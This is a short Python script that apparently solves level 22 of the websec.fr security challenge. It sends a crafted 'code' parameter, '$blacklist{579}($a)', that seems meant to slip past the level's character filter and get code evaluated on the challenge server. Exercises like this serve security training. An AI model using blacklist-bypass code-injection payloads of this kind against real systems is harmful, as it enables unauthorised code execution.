#!/usr/bin/python
# coding: utf-8

from requests import *
from bs4 import BeautifulSoup

url = 'http://websec.fr/level22/index.php'
params = {
    'code': '$blacklist{579}($a)'
}

r = get(url, params=params)
print r.text
